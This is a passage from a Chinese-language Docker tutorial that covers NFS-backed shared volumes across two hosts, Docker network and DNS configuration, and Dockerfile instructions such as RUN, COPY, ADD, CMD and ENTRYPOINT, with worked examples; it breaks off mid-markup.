//v1为创建的卷<br></code></pre></td></tr></table></figure></li><li><p>使用共享存储的映射</p></li></ol><p>将一台主机做为nfs主机， 创建相应的文件夹，并将其共享给docker的两台主机，两台docker主机将分享的文件夹映射到容器中，使得对应的容器可以共享到nfs主机的内容。可以将http等服务器的相应的页面文件夹使用这种形式，从而实现多个容器跑一个业务</p><p>nfs主机配置【192.168.6.77】</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@nfs ~]# yum -y install nfs-utils<br>[root@nfs ~]# vim /etc/exports<br>/public  *(rw)<br>[root@nfs ~]# systemctl restart nfs-server<br>Failed to restart nfs-serve.service: Unit not found<br>[root@nfs ~]# mkdir /public<br>[root@nfs ~]# cd /public/<br>[root@nfs public]# touch nfs.txt<br>[root@nfs public]# ls<br>nfs.txt<br><br>docker1主机配置<br>[root@docker1 ~]# vim /etc/fstab <br>192.168.6.77:/public /mnt/nfs nfs defaults,_netdev 0 0<br>[root@docker1 ~]# mkdir  /mnt/nfs <br>[root@docker1 ~]# systemctl restart nfs-server<br>[root@docker1 ~]# mount -a<br>[root@docker1 ~]# df -h<br>192.168.6.77:/public   17G  3.2G   14G   19% /mnt/nfs<br>[root@docker1 ~]# docker run -it -v /mnt/nfs/:/zhuhaiyan 192.168.6.153:5000/myos<br>[root@c7c376e3755a /]# cd /zhuhaiyan <br>[root@c7c376e3755a zhuhaiyan]# ls<br>nfs.txt<br><br>docker2主机配置<br>[root@docker2 ~]# vim /etc/fstab <br>192.168.6.77:/public /mnt/nfs nfs defaults,_netdev 0 0<br>[root@docker2 ~]# mkdir  /mnt/nfs <br>[root@docker2 ~]# systemctl restart nfs-server<br>[root@docker2 ~]# mount -a<br>[root@docker2 ~]# df -h<br>192.168.6.77:/public   17G  3.2G   14G   19% /mnt/nfs<br>[root@docker2 ~]# docker run -it -v /mnt/nfs/:/zhuhaiyan 192.168.6.153:5000/myos<br>[root@cdd805771d07 /]# cd /zhuhaiyan/<br>[root@cdd805771d07 zhuhaiyan]# ls<br>nfs.txt<br></code></pre></td></tr></table></figure><h2 id="9-网络设置"><a href="#9-网络设置" class="headerlink" title="9. 网络设置"></a>9. 网络设置</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker network create -d bridge test  <span class="hljs-regexp">//</span>新建网络<br><br>-d：参数指定 Docker 网络类型，有 bridge、overlay。<br><br>docker network ls。 <span class="hljs-regexp">//</span>查看创建的网络<br><br>docker run -itd --name test1 --network test ubuntu <span class="hljs-regexp">/bin/</span>bash   <span class="hljs-regexp">//</span>--network指定使用的网络<br><br></code></pre></td></tr></table></figure><p>配置 DNS</p><p>可以在宿主机的 /etc/docker/daemon.json 文件中增加以下内容来设置全部容器的 DNS：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;dns&quot;</span> : [<br>    <span class="hljs-string">&quot;114.114.114.114&quot;</span>,<br>    <span class="hljs-string">&quot;8.8.8.8&quot;</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p>设置后，启动容器的 DNS 会自动配置为 114.114.114.114 和 8.8.8.8。</p><p>配置完，需要重启 docker 才能生效。</p><p>启动时设置DNS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it --rm host_ubuntu  --dns=114.114.114.114 --dns-search=test.com ubuntu<br><br>-h HOSTNAME或者--hostname=HOSTNAME:设定容器的主机名，它会被写到容器内的 /etc/hostname 和      /etc/hosts。<br>--dns=IP_ADDRESS： 添加 DNS 服务器到容器的 /etc/resolv.conf 中，让容器用这个服务器来解析所有不在 /etc/hosts 中的主机名。<br>--dns-search=DOMAIN： 设定容器的搜索域，当设定搜索域为 .example.com 时，在搜索一个名为 host 的主机时，DNS 不仅搜索 host，还会搜索 host.example.com。<br></code></pre></td></tr></table></figure><h2 id="10-Dockerfile"><a href="#10-Dockerfile" class="headerlink" title="10 .Dockerfile"></a>10 .Dockerfile</h2><h3 id="什么是-Dockerfile？"><a href="#什么是-Dockerfile？" class="headerlink" title="什么是 Dockerfile？"></a>什么是 Dockerfile？</h3><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。</p><ol><li>案例：</li></ol><p>创建Dockerfile文件</p><p><strong>vi Dockerfile</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">FROM docker.io/kalilinux/kali-linux-docker<br>RUN echo &#x27;test&#x27; &gt; /root/test<br></code></pre></td></tr></table></figure><p>创建镜像</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker build -t kali:test .   // kali:test（镜像名称:镜像标签）,最后的 . 代表本次执行的上下文路径<br></code></pre></td></tr></table></figure><ol start="2"><li><p>FROM 和 RUN 指令的作用</p><p><strong>FROM</strong>：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。</p><p><strong>RUN</strong>：用于执行后面跟着的命令行命令。有以下俩种格式：</p></li></ol><p>shell 格式：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="bash"> &lt;命令行命令&gt;</span><br><span class="hljs-comment"># &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。</span><br></code></pre></td></tr></table></figure><p>exec 格式：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="bash"> [<span class="hljs-string">&quot;可执行文件&quot;</span>, <span class="hljs-string">&quot;参数1&quot;</span>, <span class="hljs-string">&quot;参数2&quot;</span>]</span><br><span class="hljs-comment"># 例如：</span><br><span class="hljs-comment"># RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline</span><br></code></pre></td></tr></table></figure><p><strong>注意</strong>：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="bash"> yum install wget</span><br><span class="hljs-keyword">RUN</span><span class="bash"> wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span></span><br><span class="hljs-keyword">RUN</span><span class="bash"> tar -xvf redis.tar.gz</span><br><br>以上执行会创建 <span class="hljs-number">3</span> 层镜像。可简化为以下格式：<br><br><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="bash"> yum install wget \</span><br><span class="bash">  &amp;&amp; wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span><br><span class="bash">  &amp;&amp; tar -xvf redis.tar.gz</span><br><br>如上，以 &amp;&amp; 符号连接命令，这样执行后，只会创建 <span class="hljs-number">1</span> 层镜像。<br></code></pre></td></tr></table></figure><h3 id="上下文路径"><a href="#上下文路径" class="headerlink" title="上下文路径"></a>上下文路径</h3><p>上面中，有提到指令最后一个 <strong>.</strong> 是上下文路径，那么什么是上下文路径呢？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -t kali:test .<br></code></pre></td></tr></table></figure><p>上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。</p><p><strong>解析</strong>：由于 docker 的运行模式是 C/S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。</p><p>如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。</p><p><strong>注意</strong>：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p><h3 id="指令详解"><a href="#指令详解" class="headerlink" title="指令详解"></a>指令详解</h3><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p>复制指令，从上下文目录中复制文件或者目录到容器里指定路径。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bnf">COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] <span class="hljs-attribute">&lt;源路径1&gt;</span>...  <span class="hljs-attribute">&lt;目标路径&gt;</span><br>COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] [&quot;<span class="hljs-attribute">&lt;源路径1&gt;</span>&quot;,...  &quot;<span class="hljs-attribute">&lt;目标路径&gt;</span>&quot;]<br></code></pre></td></tr></table></figure><p>**[–chown=:]**：可选参数，用户改变复制到容器内文件的拥有者和属组。</p><p>**&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">COPY</span> hom* <span class="hljs-regexp">/mydir/</span><br><span class="hljs-keyword">COPY</span> hom?.txt <span class="hljs-regexp">/mydir/</span><br></code></pre></td></tr></table></figure><p>**&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。</p><h4 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h4><p>ADD 指令和 COPY 的使用格式一致（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下：</p><ul><li>ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。</li><li>ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。</li></ul><pre><code>    因此在 COPY 和 ADD 指令中选择的时候，可以遵循这样的原则，**所有的文件复制均使用 COPY 指令，仅在需要自动解压缩的场合使用 ADD 。**</code></pre><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><p>类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:</p><ul><li>CMD 在docker run 时运行。</li><li>RUN 是在 docker build。</li></ul><p><strong>作用</strong>：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。</p><p>格式：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">CMD</span><span class="bash"> &lt;shell 命令&gt; </span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;&lt;可执行文件或命令&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param1&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param2&gt;&quot;</span>,...] </span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;&lt;param1&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param2&gt;&quot;</span>,...]  <span class="hljs-comment"># 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数</span></span><br></code></pre></td></tr></table></figure><p>推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。</p><h4 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h4><p>类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。</p><p>但是, 如果运行 docker run 时使用了 –entrypoint 选项，此选项的参数可当作要运行的程序覆盖 ENTRYPOINT 指令指定的程序。</p><p><strong>优点</strong>：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。</p><p><strong>注意</strong>：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。</p><p>格式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ENTRYPOINT <span class="hljs-selector-attr">[<span class="hljs-string">&quot;&lt;executeable&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param1&gt;&quot;</span>,<span class="hljs-string">&quot;&lt;param2&gt;&quot;</span>,...]</span><br></code></pre></td></tr></table></figure><p>当指定了 ENTRYPOINT 后， CMD 的含义就发生了改变，不再是直接的运行其命令，而是将CMD 的内容作为参数传给 ENTRYPOINT 指令，换句话说实际执行时，将变为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ENTRYPOINT</span>&gt;</span> &quot;<span class="hljs-tag">&lt;<span class="hljs-name">CMD</span>&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。</p><p>示例：</p><p>假设已通过 Dockerfile 构建了 nginx:test 镜像：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> nginx<br><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>] <span class="hljs-comment"># 定参</span></span><br><span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;/etc/nginx/nginx.conf&quot;</span>] <span class="hljs-comment"># 变参 </span></span><br></code></pre></td></tr></table></figure><p>1、不传参运行</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ docker <span class="hljs-keyword">run</span><span class="bash">  nginx:<span class="hljs-built_in">test</span></span><br></code></pre></td></tr></table></figure><p>容器内会默认运行以下命令，启动主进程。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nginx -c <span class="hljs-regexp">/etc/</span>nginx/nginx.conf<br></code></pre></td></tr></table></figure><p>2、传参运行</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ docker run  nginx:test -c <span class="hljs-regexp">/etc/</span>nginx/<span class="hljs-keyword">new</span>.conf<br></code></pre></td></tr></table></figure><p>容器内会默认运行以下命令，启动主进程(/etc/nginx/new.conf:假设容器内已有此文件)</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">nginx -c <span class="hljs-regexp">/etc/</span>nginx/<span class="hljs-keyword">new</span>.conf<br></code></pre></td></tr></table></figure><p>那么有了 CMD 后，为什么还要有 ENTRYPOINT 呢？这种 <code> &quot;&quot;</code> 有什么好处么？让我们来看几个场景。</p><p>场景一：让镜像变成像命令一样使用</p><p>  假设我们需要一个得知自己当前公网 IP 的镜像，那么可以先用 CMD 来实现：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM ubuntu:<span class="hljs-number">16.04</span><br>RUN apt-get update \<br>&amp;&amp; apt-get install -y curl \<br>&amp;&amp; rm -rf <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/apt/</span>lists/*<br>CMD [ <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-s&quot;</span>, <span class="hljs-string">&quot;http://ip.cn&quot;</span> ]<br></code></pre></td></tr></table></figure><p>假如我们使用 <code>docker build -t myip .</code> 来构建镜像的话，如果我们需要查询当前公网 IP，只需要执行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-builtin-name">run</span> myip<br>当前 IP：61.148.226.66 来自：北京市 联通<br></code></pre></td></tr></table></figure><p>嗯，这么看起来好像可以直接把镜像当做命令使用了，不过命令总有参数，如果我们希望加参数呢？比如从上面的 CMD 中可以看到实质的命令是 curl ，那么如果我们希望显示 HTTP头信息，就需要加上 -i 参数。那么我们可以直接加 <code>-i 参数</code>给 <code>docker run myip</code> 么？</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">$ docker run myip <span class="hljs-operator">-</span>i<br>docker: <span class="hljs-type">Error</span> response from daemon: invalid header field value <span class="hljs-string">&quot;oci runtime error: con</span><br><span class="hljs-string">tainer_linux.go:247: starting container process caused <span class="hljs-subst">\&quot;</span>exec: <span class="hljs-subst">\\</span><span class="hljs-subst">\&quot;</span>-i<span class="hljs-subst">\\</span><span class="hljs-subst">\&quot;</span>: executable</span><br><span class="hljs-string">file not found in $PATH<span class="hljs-subst">\&quot;</span><span class="hljs-subst">\n</span>&quot;</span>.<br></code></pre></td></tr></table></figure><p>我们可以看到可执行文件找不到的报错， <code>executable file not found</code> 。之前我们说过，跟在镜像名后面的是 command ，运行时会替换 CMD 的默认值。因此这里的 -i 替换了原来的 CMD ，而不是添加在原来的 <code>curl -s http://ip.cn</code> 后面。而 -i 根本不是命令，所以自然找不到。</p><p>那么如果我们希望加入 -i 这参数，我们就必须重新完整的输入这个命令：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ docker run myip curl -s http:<span class="hljs-comment">//ip.cn -i</span><br></code></pre></td></tr></table></figure><p>这显然不是很好的解决方案，而使用 ENTRYPOINT 就可以解决这个问题。现在我们重新用 ENTRYPOINT 来实现这个镜像：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">FROM ubuntu:<span class="hljs-number">16.04</span><br>RUN apt-get update \<br>&amp;&amp; apt-get install -y curl \<br>&amp;&amp; rm -rf <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/apt/</span>lists/*<br>ENTRYPOINT [ <span class="hljs-string">&quot;curl&quot;</span>, <span class="hljs-string">&quot;-s&quot;</span>, <span class="hljs-string">&quot;http://ip.cn&quot;</span> ]<br></code></pre></td></tr></table></figure><p>这次我们再来尝试直接使用 docker run myip -i ：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ docker run myip<br>当前 IP：<span class="hljs-number">61.148</span><span class="hljs-number">.226</span><span class="hljs-number">.66</span> 来自：北京市 联通<br>$ docker run myip -i<br>HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-keyword">Server</span>: nginx/<span class="hljs-number">1.8</span><span class="hljs-number">.0</span><br><span class="hljs-type">Date</span>: Tue, <span class="hljs-number">22</span> Nov <span class="hljs-number">2016</span> <span class="hljs-number">05</span>:<span class="hljs-number">12</span>:<span class="hljs-number">40</span> GMT<br>Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=UTF<span class="hljs-number">-8</span><br>Vary: Accept-<span class="hljs-keyword">Encoding</span><br>X-Powered-<span class="hljs-keyword">By</span>: PHP/<span class="hljs-number">5.6</span><span class="hljs-number">.24</span><span class="hljs-number">-1</span>~dotdeb+<span class="hljs-number">7.1</span><br>X-<span class="hljs-keyword">Cache</span>: MISS from <span class="hljs-keyword">cache</span><span class="hljs-number">-2</span><br>X-<span class="hljs-keyword">Cache</span>-Lookup: MISS from <span class="hljs-keyword">cache</span><span class="hljs-number">-2</span>:<span class="hljs-number">80</span><br>X-<span class="hljs-keyword">Cache</span>: MISS from proxy<span class="hljs-number">-2</span>_6<br>Transfer-<span class="hljs-keyword">Encoding</span>: chunked<br>Via: <span class="hljs-number">1.1</span> <span class="hljs-keyword">cache</span><span class="hljs-number">-2</span>:<span class="hljs-number">80</span>, <span class="hljs-number">1.1</span> proxy<span class="hljs-number">-2</span>_6:<span class="hljs-number">8006</span><br><span class="hljs-keyword">Connection</span>: keep-alive<br><br>当前 IP：<span class="hljs-number">61.148</span><span class="hljs-number">.226</span><span class="hljs-number">.66</span> 来自：北京市 联通<br></code></pre></td></tr></table></figure><p>  可以看到，这次成功了。这是因为当存在 ENTRYPOINT 后， CMD 的内容将会作为参数传给 ENTRYPOINT ，而这里 -i 就是新的 CMD ，因此会作为参数传给 curl ，从而达到了我们预期的效果。</p><p>场景二：应用运行前的准备工作</p><p>  启动容器就是启动主进程，但有些时候，启动主进程前，需要一些准备工作。比如 mysql 类的数据库，可能需要一些数据库配置、初始化的工作，这些工作要在最终的 mysql 服务器运行之前解决。</p><p>  此外，可能希望避免使用 root 用户去启动服务，从而提高安全性，而在启动服务前还需要以 root 身份执行一些必要的准备工作，最后切换到服务用户身份启动服务。或者除了服务外，其它命令依旧可以使用 root 身份执行，方便调试等。</p><p>  这些准备工作是和容器 CMD 无关的，无论 CMD 为什么，都需要事先进行一个预处理的工作。这种情况下，可以写一个脚本，然后放入 ENTRYPOINT 中去执行，而这个脚本会将接到的参数（也就是 ）作为命令，在脚本最后执行。比如官方镜像 redis 中就是这么做的：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> alpine:<span class="hljs-number">3.4</span><br><br>...<br><br><span class="hljs-keyword">RUN</span><span class="bash"> addgroup -S redis &amp;&amp; adduser -S -G redis redis</span><br><br>...<br><br><span class="hljs-keyword">ENTRYPOINT</span><span class="bash"> [<span class="hljs-string">&quot;docker-entrypoint.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">6379</span><br><br><span class="hljs-keyword">CMD</span><span class="bash"> [ <span class="hljs-string">&quot;redis-server&quot;</span> ]</span><br></code></pre></td></tr></table></figure><p>  可以看到其中为了 redis 服务创建了 redis 用户，并在最后指定了 ENTRYPOINT 为 dockerentrypoint.sh 脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>...<br><span class="hljs-comment"># allow the container to be started with `--user`</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-string">&#x27;redis-server&#x27;</span> -a <span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span> = <span class="hljs-string">&#x27;0&#x27;</span> ]; <span class="hljs-keyword">then</span><br><br>    chown -R redis .<br>    <span class="hljs-built_in">exec</span> su-exec redis <span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br></code></pre></td></tr></table></figure><p>  该脚本的内容就是根据 CMD 的内容来判断，如果是 redis-server 的话，则切换到 redis 用户身份启动服务器，否则依旧使用 root 身份执行。比如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ docker <span class="hljs-builtin-name">run</span> -it redis id<br><span class="hljs-attribute">uid</span>=0(root) <span class="hljs-attribute">gid</span>=0(root) <span class="hljs-attribute">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>  而使用 <code>service nginx start</code> 命令，则是希望 <code>systemd</code> 来以后台守护进程形式启动 nginx 服务。而刚才说了 <code>CMD service nginx start</code> 会被理解为 CMD [ “sh”, “-c”, “service nginxstart”] ，<strong>因此主进程实际上是 sh 。那么当 service nginx start 命令结束后， sh 也就结束了， sh 作为主进程退出了，自然就会令容器退出。</strong></p><p>  正确的做法是<strong>直接执行 nginx 可执行文件</strong>，并且要求以前台形式运行。比如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">CMD <span class="hljs-selector-attr">[<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>仅仅只是声明端口。</p><p><strong>EXPOSE 指令是声明运行时容器提供服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。</strong></p><p>作用：</p><ul><li>帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。</li><li>在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。</li></ul><p>格式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">EXPOSE</span> &lt;端口<span class="hljs-number">1</span>&gt;<span class="hljs-meta"> [&lt;端口2&gt;...]</span><br></code></pre></td></tr></table></figure><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><p>指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。（WORKDIR 指定的工作目录，必须是提前创建好的）。</p><p>docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">WORKDIR <span class="hljs-attribute">&lt;工作目录路径&gt;</span><br></code></pre></td></tr></table></figure><h3 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h3><p>用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。</p><p>格式：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code 